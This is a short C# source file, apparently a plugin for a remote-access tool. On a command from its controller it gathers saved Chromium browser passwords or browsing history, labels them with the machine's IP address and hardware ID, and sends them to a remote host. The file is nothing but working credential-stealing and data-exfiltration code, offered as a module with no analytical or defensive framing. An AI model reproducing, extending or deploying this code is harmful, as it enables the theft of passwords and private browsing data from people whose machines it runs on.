using PacketLib.Utils;
using PacketLib.Packet;
using PacketLib;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            ClientHandler clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key);
            clientHandler.ConnectStart();
       
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.RECOVERY_PASSWORDS:
                    PasswordsPacket passwordsPacket = new PasswordsPacket(Chromium.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                    while (!clientHandler.Connected)
                        Thread.Sleep(1000);

                    clientHandler.SendPacket(passwordsPacket);
                    break;

                case PacketType.RECOVERY_HISTORY:
                    HistoryPacket historyPacket = new HistoryPacket(History.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                    while (!clientHandler.Connected)
                        Thread.Sleep(1000);

                    clientHandler.SendPacket(historyPacket);
                    break;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
